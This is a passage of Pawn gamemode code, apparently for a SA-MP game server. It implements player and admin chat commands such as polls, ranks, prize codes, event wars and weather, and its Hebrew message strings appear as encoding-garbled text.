			format(string,sizeof(string),"%dCodeText",correctCode);
			fsetstring(file_codes,string,"None");
			for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][usedcode][correctCode]) playerinfo[j][usedcode][correctCode] = false;
		}
		playerinfo[playerid][usedcode][correctCode] = true;
		playerinfo[playerid][pcode][0] = prz;
		format(string,sizeof(string),"%dPrizeAmount",correctCode);
		playerinfo[playerid][pcode][1] = fgetint(file_codes,string);
		playerinfo[playerid][pcode][2] = INVALID_PLAYER_ID;
		playerinfo[playerid][pcode][3] = 15;
		new pCode = CallRemoteFunction("GetPlayerPrize","i",playerid);
		format(dia,sizeof(dia),@c(green) "%s :ыь фысху! цыщ· сўху юёхт",Codes[playerinfo[playerid][pcode][0]][cdName]);
		if(playerinfo[playerid][pcode][1] > 0)
		{
			if(Codes[playerinfo[playerid][pcode][0]][cdSID] > 0) format(dia,sizeof(dia),"%s\n[юёЇ° щющэ: %d]",dia,playerinfo[playerid][pcode][1]);
			else format(dia,sizeof(dia),"%s\n[ыюх· юхё·°·]",dia);
		}
		format(dia,sizeof(dia),"%s\n\n" @c(lightblue) ":·хыь ьсЎЄ юёЇ° ЇЄхьх· ы°тЄ",dia);
		format(dia,sizeof(dia),"%s\n\n" @c(yellow) "Х ьф∙·ю∙ сўху - ьўсь р· юф ∙фхр юрЇ∙°",dia);
		format(dia,sizeof(dia),"%s\nХ ьц°хў р· фўху - ьсшь р· фЇ°ё ∙ьх, ьр юхюьї",dia);
		format(dia,sizeof(dia),"%s\nХ ьфЄсщ° р· фўху ь∙чўя рч° - ьсчх° ∙чўя ∙щўсь ююъ р· фўху",dia);
		if(pCode > 0 && Codes[playerinfo[playerid][pcode][0]][cdSID] > 0) format(dia,sizeof(dia),"%s" @c(red) "\n\n∙щэ ьс! щ∙ ьъ ыс° ўху. рэ ·сч° ьф∙·ю∙ сўху, фўху фўхуэ ∙ьъ щхчьє счу∙",dia);
		format(dia,sizeof(dia),"%s\n\n" @c(pink) "...\"ыущ ьсчх° ЇЄхьф ьчї Єь \"фю∙ъ",dia);
		ShowPlayerDialog(playerid,dialog_code,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўху",dia,"фю∙ъ","");
		if(playerinfo[playerid][pcode][1] > 0 && Codes[playerinfo[playerid][pcode][0]][cdSID] > 0) format(string,sizeof(string)," ╗ [юёЇ° щющэ: %d] !" @c(lightgreen) "\"%s\"" @c(green) " цыф сўху %s л",playerinfo[playerid][pcode][1],Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
		else format(string,sizeof(string)," ╗ !" @c(lightgreen) "\"%s\"" @c(green) " цыф сўху %s л",Codes[playerinfo[playerid][pcode][0]][cdName],GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/codelist"))
	{
		new list[450];
		for(new i = 1; i < sizeof(Codes); i++) format(list,sizeof(list),!strlen(list) ? (@c(yellow)"%s Х %d) %s") : ("%s\r\n Х %d) %s"),list,i,Codes[i][cdName]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ёхтщ фўхущэ",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/ranks"))
	{
		new string[M_S], rnks = 0, ps = 0;
		for(new i = 0; i < MAX_RANKS; i++) if(strlen(rankname[i]) > 0 && !equal(rankname[i],"None")) rnks++;
		if(!rnks) return SendClientMessage(playerid,red," .рщя ∙хэ ўсхЎх· ю∙·ю∙щэ с∙°·");
		format(string,sizeof(string)," ~~~ :ўсхЎх· ю∙·ю∙щэ - %d ~~~",rnks);
		SendClientMessage(playerid,lightblue,string);
		rnks = 0;
		for(new i = 0; i < MAX_RANKS; i++)
		{
			if(strlen(rankname[i]) > 0 && !equal(rankname[i],"None"))
			{
				rnks++, ps = 0;
				for(new ii = 0; ii < MAX_PLAYERS_; ii++) if(IsPlayerConnected(ii) && PlayerHasRank(ii,i)) ps++;
				format(string,sizeof(string)," %d. %s [ID: %02d | %d :ю∙·ю∙щэ ючхс°щэ юўсхЎф цх]",rnks,rankname[i],i,ps);
				SendClientMessage(playerid,green,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/srank"))
	{
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /srank [rank id] :Ўх°· ∙щюх∙");
		new found = 0, id = strval(cmd);
		if(id < 1 || id > MAX_RANKS || equal(rankname[id],"None") || !strlen(rankname[id])) return SendClientMessage(playerid,red," .юёЇ° ўсхЎф ∙тхщ");
		id--;
		format(string,sizeof(string)," :·хЎрх· чщЇх∙ ∙чўЁщэ юўсхЎф юёЇ° %d",id);
		SendClientMessage(playerid,green,string);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && PlayerHasRank(i,id))
		{
			found++;
			format(string,sizeof(string)," Х %d. %s (ID: %03d)",found,GetName(i),i);
			SendClientMessage(playerid,yellow,string);
		}
		if(!found) return SendClientMessage(playerid,red," .рщя ·хЎрх·: Ё°рф ∙рщя ∙чўЁщэ ючхс°щэ юфўсхЎф ∙Ё··");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ·хЎрх·",found);
			SendClientMessage(playerid,green,string);
		}
		return 1;
	}
	if(equal(cmd,"/pranks"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pranks [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid), found = 0, string[M_S];
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		for(new i = 0; i < MAX_RANKS; i++) if(PlayerHasRank(id,i))
		{
			found++;
			format(string,sizeof(string)," Х %d. [%s [ўсхЎф юёЇ° %02d",found,rankname[i],i);
			SendClientMessage(playerid,yellow,string);
		}
		if(!found) return SendClientMessage(playerid,red," .рщя ·хЎрх·: Ё°рф ∙ф∙чўя фцф рщЁх чс° с∙хэ ўсхЎ· ю∙·ю∙щэ");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ·хЎрх·",found);
			SendClientMessage(playerid,green,string);
		}
		return 1;
	}
	if(equal(cmd,"/mytime"))
	{
		if(!playerinfo[playerid][setting][setting_clock]) return SendClientMessage(playerid,red," /setting :ь∙щюх∙ сЇўхуф цх ф∙Єхя Ў°щъ ьфщх· ЇЄщь рЎьъ. ьфЇЄьф");
		new string[M_S], h = 0, m = 0;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /mytime [hour] [minute] :Ўх°· ф∙щюх∙");
			GetPlayerTime(playerid,h,m);
			format(string,sizeof(string)," .ф∙Єф фЁхычщ· рЎьъ фщр %02d:%02d",h,m);
			return SendClientMessage(playerid,white,string);
		}
		h = strval(cmd), cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /mytime [hour]:[minute] :Ўх°· ф∙щюх∙");
		m = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
		if(h < 0 || h > 23) return SendClientMessage(playerid,red," .∙Єф ∙тхщф");
		if(m < 0 || m > 59) return SendClientMessage(playerid,red," .уўф ∙тхщф");
		SetPlayerTime(playerid,h,m);
		format(string,sizeof(string)," .ф∙Єф рЎьъ ∙хЁ·ф ь %02d:%02d",h,m);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/vote") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /vote [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /vote start [question] - ф·чь· фЎсЄф");
			return SendClientMessage(playerid,white," /vote end - фЇёў· ффЎсЄф");
		}
		new string[M_S];
		if(equal(cmd,"start"))
		{
			if(voteinfo[vStatus]) return SendClientMessage(playerid,red," .ыс° щ∙ фЎсЄф");
			cmd = strrest(cmdtext,idx);
			voteinfo[vStatus] = 1, voteinfo[vTotal] = {0,0};
			format(voteinfo[vText],128,cmd);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][voted] = 0;
			SendClientMessage(playerid,blue," /vote end ф·чь· фЎсЄф, сыущ ьёщщэ рх·ф ф∙·ю∙ сЇўхуф");
			format(string,sizeof(string)," ~~~ :ф·чщь фЎсЄф Єэ ф∙рьф %s фрующя ~~~",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(white,cmd);
			SendClientMessageToAll(orange," Х /Yes - ?сЄу Х /No - ?Ёту");
			SendClientMessageToAll(orange," Х /VoteInfo - юЎс ффЎсЄх· Х /Mode 65 - юЄ°ы· ффЎсЄх·");
		}
		else if(equal(cmd,"end"))
		{
			if(!voteinfo[vStatus]) return SendClientMessage(playerid,red," .рщя ∙хэ фЎсЄф");
			voteinfo[vStatus] = 0;
			format(string,sizeof(string)," ~~~ :ёщщэ р· ффЎсЄф %s фрующя ~~~",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(white,voteinfo[vText]);
			if(!voteinfo[vTotal][0] && !voteinfo[vTotal][1]) SendClientMessageToAll(red," !рє рчу ьр фЎсщЄ");
			else
			{
				format(string,sizeof(string)," :щ∙Ёя %d фЎсЄх· чщхсщх· х %d фЎсЄх· ∙ьщьщх·",voteinfo[vTotal][0],voteinfo[vTotal][1]);
				SendClientMessage(playerid,green,string);
				if(voteinfo[vTotal][0] == voteinfo[vTotal][1]) SendClientMessageToAll(green," - !∙щххщхя -");
				else SendClientMessageToAll(green,voteinfo[vTotal][0] > voteinfo[vTotal][1] ? (" щ∙ щх·° фЎсЄх· чщхсщх· юр∙° ∙ьщьщх·") : (" щ∙ щх·° фЎсЄх· ∙ьщьщх· юр∙° чщхсщх·"));
				new totalVotes = voteinfo[vTotal][1] + voteinfo[vTotal][0], totalPlayers = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) totalPlayers++;
				format(string,sizeof(string)," (ёъ фыь фЎсщЄх %d рчхц юф∙чўЁщэ с∙°· (%d/%d ∙чўЁщэ",(totalVotes * 100) / totalPlayers,totalPlayers,totalVotes);
				SendClientMessageToAll(darkblue,string);
			}
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/voteinfo"))
	{
		if(!voteinfo[vStatus]) return SendClientMessage(playerid,red," .рщя фЎсЄф ыЄ·");
		new totalVotes = voteinfo[vTotal][1] + voteinfo[vTotal][0], totalPlayers = 0, string[M_S];
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) totalPlayers++;
		SendClientMessage(playerid,lightblue," ~~~ :юЎс ффЎсЄф ~~~");
		format(string,sizeof(string)," (сЁ·щщэ фЎсщЄх %d рчхц юф∙чўЁщэ с∙°· (%d/%d ∙чўЁщэ",(totalVotes * 100) / totalPlayers,totalPlayers,totalVotes);
		SendClientMessage(playerid,darkblue,string);
		format(string,sizeof(string)," сЁ·щщэ: %d фЎсЄх· чщхсщх· х %d фЎсЄх· ∙ьщьщх·",voteinfo[vTotal][0],voteinfo[vTotal][1]);
		SendClientMessage(playerid,darkblue,string);
		return 1;
	}
	if(equal(cmd,"/yes"))
	{
		if(!voteinfo[vStatus]) return SendClientMessage(playerid,red," .рщя фЎсЄф ыЄ·");
		if(playerinfo[playerid][voted]) return SendClientMessage(playerid,red," .Ёщ·я ьфЎсщЄ ЇЄэ рч· сьсу");
		voteinfo[vTotal][0]++;
		playerinfo[playerid][voted] = 1;
		SendClientMessage(playerid,green," .(фЎсЄ· сЄу (чщхсщ");
		return 1;
	}
	if(equal(cmd,"/no"))
	{
		if(!voteinfo[vStatus]) return SendClientMessage(playerid,red," .рщя фЎсЄф ыЄ·");
		if(playerinfo[playerid][voted]) return SendClientMessage(playerid,red," .Ёщ·я ьфЎсщЄ ЇЄэ рч· сьсу");
		voteinfo[vTotal][1]++;
		playerinfo[playerid][voted] = 1;
		SendClientMessage(playerid,green," .(фЎсЄ· Ёту (∙ьщьщ");
		return 1;
	}
	if(equal(cmd,"/smupdate") && IsPlayerMAdmin(playerid))
	{
		UpdateServerMessage();
		SendClientMessage(playerid,green," .ффхуЄф ЄхуыЁф");
		return 1;
	}
	if(equal(cmd,"/smoff") && IsPlayerMAdmin(playerid))
	{
		serverMsgExist = 0;
		SendClientMessage(playerid,green," .ффхуЄф ьр ·хЎт");
		return 1;
	}
	if(equal(cmd,"/smon") && IsPlayerMAdmin(playerid))
	{
		serverMsgExist = 1;
		SendClientMessage(playerid,green," .ффхуЄф ·хЎт");
		return 1;
	}
	if(equal(cmd,"/hslist"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ёхтщ шсьрх· ф∙щрщэ ~~~");
		SendClientMessage(playerid,yellow," Х 1. Kills - шсь· ∙щрщэ ьф°щтх· с∙°·");
		SendClientMessage(playerid,yellow," Х 2. Race Records - ющ°хЎщэ (/race records)");
		return 1;
	}
	if(equal(cmd,"/hsupdate") && IsPlayerMAdmin(playerid))
	{
		KillsList(0);
		SendClientMessage(playerid,green," .ф°∙щюф ЄхуыЁф");
		return 1;
	}
	if(equal(cmd,"/hsshow") && IsPlayerMAdmin(playerid)) return KillsList();
	if(equal(cmd,"/hsshow2") && IsPlayerMAdmin(playerid)) return ClansRulingList();
	if(equal(cmd,"/ewar"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /ewar [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /ewar state :фЎт· юЎс фрўёш°ф ххр° фЁхычщ·");
			SendClientMessage(playerid,white," /ewar join :фЎш°Їх· ьрўёш°ф ххр°");
			SendClientMessage(playerid,white," /ewar quit :Ї°щ∙ф юфрўёш°ф ххр°");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /ewar start [extra war type] :ф·чь· рўёш°ф ххр°");
				SendClientMessage(playerid,white," /ewar end [reason] :ёщхэ фрўёш°ф ххр°");
			}
			SendClientMessage(playerid,white," /ewar types :°∙щю· ёхтщ рўёш°ф ххр°");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(ewarinfo[0])
			{
				if(ewarinfo[2] > 1)
				{
					format(string,sizeof(string)," .щ∙ ыЄ· рўёш°ф ххр° хфщр ··чщь сЄху %d ∙Ёщх·",ewarinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· рўёш°ф ххр° хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· рўёш°ф ххр°");
		}
		else if(equal(cmd,"join"))
		{
			if(!ewarinfo[0]) return SendClientMessage(playerid,red," .рщя рўёш°ф ххр° ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitewar]) return SendClientMessage(playerid,red," .фрўёш°ф ххр° ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inewar]) return SendClientMessage(playerid,red," .р·ф ыс° рўёш°ф ххр°");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(ewarinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .ыь фюўхюх· срўёрш°ф ххр° ·Їхёщэ");
			if(ewarinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitewar] = 1;
			ewarinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ьрўёш°ф ххр° Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф°хт р· ыь ф∙чўЁщэ ∙фЎш°Їх тэ фэ ьрўёш°ф ххр°");
			format(string,sizeof(string)," Х [#%d] %s :ёхт фрўёш°ф ххр°",ewarinfo[4]+1,ewars[ewarinfo[4]][ewName]);
			SendClientMessage(playerid,lightgreen,string);
			SendClientMessage(playerid,lightgreen,ewars[ewarinfo[4]][ewText]);
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",ewarinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!ewarinfo[0]) return SendClientMessage(playerid,red," .рщя рўёш°ф ххр° ы°тЄ");
			if(!playerinfo[playerid][inewar]) return SendClientMessage(playerid,red," .р·ф ьр срўёш°ф ххр°");
			SendClientMessage(playerid,green," .Ї°∙· юфрўёш°ф ххр°");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(ewarinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ рўёш°ф ххр°");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			new t = !strlen(cmd) ? 1 : strval(cmd);
			if(t < 1 || t > sizeof(ewars)) return SendClientMessage(playerid,red," .ёхт рўёш°ф ххр° ∙тхщ");
			ewarinfo[4] = t;
			StartEWar();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!ewarinfo[0]) return SendClientMessage(playerid,red," .рщя рўёш°ф ххр° ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndEWar(reason,playerid);
		}
		else if(equal(cmd,"types"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :ёхтщ рўёш°ф ххр° ~~~");
			for(new i = 0; i < sizeof(ewars); i++)
			{
				format(string,sizeof(string)," Х %d - %s",i + 1,ewars[i][ewName]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· рўёш°ф ххр° ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/wol"))
	{
		if(!thereIsWol) return SendClientMessage(playerid,red," .рщя ЇЄщьх· тьть фюць ыЄ·");
		if(playerinfo[playerid][pwol]) return SendClientMessage(playerid,red," .Ёщ·я ьфт°щь р· ∙юъ ЇЄэ рч· сьсу");
		if(GetMoney(playerid) < 100) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ф∙··Їх· стьть фюць Єхьф 100$");
		GiveMoney(playerid,0-100,11);
		wolPrize += 120;
		playerinfo[playerid][pwol] = 1;
		new string[M_S];
		format(string,sizeof(string)," .∙юъ фхыЁё ьфт°ь· тьть фюць. рЁр фю·я ыущ ь°рх· рэ цыщ·. ёыхэ ффт°ьф Єхюу ыЄ· Єь $%d",wolPrize);
		SendClientMessage(playerid,green," .∙юъ фхыЁё ьфт°ь· тьть фюць. рЁр фю·я ь°рх· рэ цыщ·");
		return 1;
	}
	if(equal(cmd,"/startwol") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0 || thereIsWol) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ю∙Ёщ· ЇхЄь·");
		WoL();
		return 1;
	}
	if(equal(cmd,"/weather"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .Їўхуф цх ·чцх° сў°хс");
		new string[M_S];
		format(string,sizeof(string)," .юцт фрхщ°: %s",GetWeatherName());
		SendClientMessage(playerid,yellow,string);
		if(israelWeather[2] == 1) string = "∙Єф рч·";
		else format(string,sizeof(string),"%d ∙Єх·",israelWeather[2]);
		format(string,sizeof(string)," .(сющуф хчь ∙щЁхщ сюцт фрхщ° ср°ї, фхр щЄхуыя рхшхюшщ· Єь щущ фюЄ°ы· сЄху %s (юхЄ°ъ",string);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/myweather"))
	{
		ShowPlayerDialog(playerid,dialog_setpwea,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· юцт рхщ°","°тщь\nщхэ сфщ°\nсфщ° щх·°\nсфщ° Єэ ЄЁЁщэ\nщхэ ё·щх\n°тщь Єэ ЄЁЁщэ\n∙ющщэ ётхьщэ\nт∙э, с°ўщэ х°Єющэ\nЄ°Їь\nьЇЁщ т∙э\nт∙э чцў щх·°\n∙ющщэ сфщ°щэ\nёхЇ· чхь\nЄЁЁщэ ∙чх°щэ","счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/uw") && IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		format(string,sizeof(string)," .%s юцт фрхщ° с∙°· Єхуыя ьюцт фрхщ° сщ∙°рь Єь щущ фрующя",GetName(playerid));
		SendClientMessageToAll(green,string);
		SetWeatherToIsraelWeather();
		return 1;
	}
	if(equal(cmd,"/svinfo"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
		new v = GetPlayerVehicleID(playerid);
		if(!vehicleinfo[v][vspecial]) return SendClientMessage(playerid,red," .ф°ыс ∙р·ф ЁюЎр сх рщЁх °ыс ющхчу");
		switch(vehicleinfo[v][vspecialid])
		{
			case SV_SUBMARINE:
			{
				SendClientMessage(playerid,lightblue," ~~~ :Ўхьь· ~~~");
				SendClientMessage(playerid,grey," Х ~k~~VEHICLE_HORN~ Ўьщьф: ьчї Єь юў∙ фЎЇщ°ф");
				SendClientMessage(playerid,grey," Х ~k~~VEHICLE_FIREWEAPON~ шх°Їух: ьчї Єь юў∙ фф·ўЇф");
				GameTextForPlayer(playerid,"~b~submarine:~n~~h~~k~~VEHICLE_HORN~ - dive~n~~k~~VEHICLE_FIREWEAPON~ - torpedo",3000,5);
			}
			case SV_DOLPHIN1, SV_DOLPHIN2:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ухьЇщя ~~~");
				SendClientMessage(playerid,grey," Х ~k~~VEHICLE_HORN~ Ўьщьф: ьчї Єь юў∙ фЎЇщ°ф");
				GameTextForPlayer(playerid,"~b~dolphin:~n~~h~~k~~VEHICLE_HORN~ - dive",3000,5);
			}
			case SV_BALL: SendClientMessage(playerid,grey," !р·ф °ў ыух°");
			case SV_PIRATE:
			{
				SendClientMessage(playerid,lightblue," ~~~ :ёЇщЁ· фыёє ~~~");
				SendClientMessage(playerid,grey," Х ~k~~VEHICLE_FIREWEAPON~ шх°Їух: ьчї Єь юў∙ фф·ўЇф");
				GameTextForPlayer(playerid,"~b~money ship:~n~~h~~k~~VEHICLE_FIREWEAPON~ - torpedo",3000,5);
			}
			default: SendClientMessage(playerid,grey," .рщя ющуЄ цющя");
		}
		return 1;
	}
	if(equal(cmd,"/sail"))
	{
		if(!CanUseCommand(playerid)) return 1;
		if(GetPlayerVirtualWorld(playerid) != world_normal || GetPlayerInterior(playerid) != 0 || !IsPlayerInRangeOfPoint(playerid,30.0,2001.14,1555.10,24.88)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс ьёЇщЁ· фыёє");
		if(pirateUser[0] != INVALID_PLAYER_ID)
		{
			new string[M_S];
			if(pirateUser[0] == playerid) format(string,sizeof(string)," ~k~~VEHICLE_ENTER_EXIT~ р·ф ы°тЄ ю∙·ю∙ сёЇщЁ· фыёє хЁ∙р°х ьъ %d ∙Ёщх·. рэ р·ф юЄхЁщщя ьЎр·, ьчї",pirateUser[1]);
			else format(string,sizeof(string)," .ю∙·ю∙ сёЇщЁ· фыёє хЁ∙р°х ьх %d ∙Ёщх· ьёщхэ %s ы°тЄ",pirateUser[1],GetName(pirateUser[0]));
			return SendClientMessage(playerid,red,string);
		}
		ShowPlayerDialog(playerid,dialog_sail,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щщш сёЇщЁ· фыёє",@c(blue) ".Ёщ·я ьф∙·ю∙ цюЁщ· сёЇщЁ· фыёє ь∙щщш\n!с·∙ьхэ ∙ь 10000$, ·хыь ь∙хш сЄЎюъ сёЇщЁ· фыёє сщчу Єэ ющ ∙·°Ўф\n\n" @c(red) "* ф∙щщш фхр ью∙ъ уўф хчЎщ сьсу","ўЁф","ётх°");
		return 1;
	}
	if(equal(cmd,"/ftt"))
	{
		if(specialActivity != sa_ftt) return SendClientMessage(playerid,red," .Find The Treasure рщя ыЄ· ЇЄщьх·");
		if(playerinfo[playerid][fttused] >= 2) return SendClientMessage(playerid,red," .ыс° ф∙·ю∙· ЇЄющщэ срЇ∙°х· цх");
		new string[M_S];
		format(string,sizeof(string)," .фю°чў сщЁъ ьсщя фюшюхя: %d",GetPlayerDistanceToPointEx(playerid,FTTPositions[FTTPlace][0],FTTPositions[FTTPlace][1],FTTPositions[FTTPlace][2]));
		SendClientMessage(playerid,yellow,string);
		playerinfo[playerid][fttused]++;
		return 1;
	}
	if(equal(cmd,"/ach"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /ach [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /ach start - ф·чь· ю∙щюф ∙ь юЄ°ы· ффщ∙щтщэ");
			return SendClientMessage(playerid,white," /ach stop - щЎщрф юю∙щюф ∙ь юЄ°ы· ффщ∙щтщэ");
		}
		if(equal(cmd,"start"))
		{
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][ach][0] > -1) return SendClientMessage(playerid,red," .р·ф ыс° сю∙щю· юЄ°ы· ффщ∙щтщэ");
			new string[1024];
			for(new i = 0; i < sizeof(Achievements); i++) format(string,sizeof(string),!strlen(string) ? ("%s%d. %s (Money: %d$)") : ("%s\n%d. %s (Money: %d$)"),string,i+1,Achievements[i][achName],Achievements[i][achPrize]);
			ShowPlayerDialog(playerid,dialog_achievements,DIALOG_STYLE_LIST,@c(lightblue) "ю∙щюх· юЄ°ы· ффщ∙щтщэ",string,"счщ°ф","сщшхь");
		}
		else if(equal(cmd,"stop"))
		{
			if(playerinfo[playerid][ach][0] == -1) return SendClientMessage(playerid,red," .р·ф ьр с∙хэ ю∙щю· фщ∙щтщэ");
			new string[M_S];
			format(string,sizeof(string)," .фЇёў· р· ю∙щюф #%d",playerinfo[playerid][ach][0]+1);
			SendClientMessage(playerid,red,string);
			EndAchievement(playerid,1);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ю∙щюф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/fttstart") && IsPlayerMAdmin(playerid))
	{
		if(specialActivity == sa_ftt) return SendClientMessage(playerid,red," .Find The Treasure ыс° щ∙ ЇЄщьх·");
		if(specialActivity != sa_none) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ющхчу·");
		if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18 ь·ЇЄхь ЇЄщьхщх· ющхчух·");
		StartFTT();
		return 1;
	}
	if(equal(cmd,"/fttend") && IsPlayerMAdmin(playerid))
	{
		if(specialActivity != sa_ftt) return SendClientMessage(playerid,red," .Find The Treasure рщя ыЄ· ЇЄщьх·");
		if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18 ь·ЇЄхь ЇЄщьхщх· ющхчух·");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) cmd = "рщя";
		EndFTT(-1);
		format(string,sizeof(string)," :ёщсф ,%s схшьф Єь щущ фрующя Find The Treasure фЇЄщьх· фющхчу·",GetName(playerid));
		SendClientMessageToAll(red,string);
		SendClientMessageToAll(red,cmd);
		return 1;
	}
	if(equal(cmd,"/partystart") && IsPlayerMAdmin(playerid))
	{
		if(specialActivity == sa_party) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· юёщсф");
		if(specialActivity != sa_none) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ющхчу·");
		if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18 ь·ЇЄхь ЇЄщьхщх· ющхчух·");
		StartParty();
		return 1;
	}
	if(equal(cmd,"/partyend") && IsPlayerMAdmin(playerid))
	{
		if(specialActivity != sa_party) return SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юёщсф");
